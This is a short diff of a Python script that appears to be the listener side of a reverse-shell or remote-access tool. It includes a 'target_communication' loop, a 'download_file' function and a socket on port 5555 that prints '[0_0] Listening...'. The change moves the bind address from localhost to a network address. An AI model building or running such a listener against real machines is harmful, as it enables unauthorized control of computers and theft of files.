@@ -38,7 +38,6 @@ def download_file(file_name):
     target.settimeout(None)
     file.close()
 
-
 def target_communication():
     count = 0
     while True:
@@ -84,7 +83,7 @@ def target_communication():
 
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.bind(('127.0.0.1', 5555))
+sock.bind(('102.168.122.121', 5555))
 print(colored('[0_0] Listening...', 'green'))
 sock.listen(5)
 
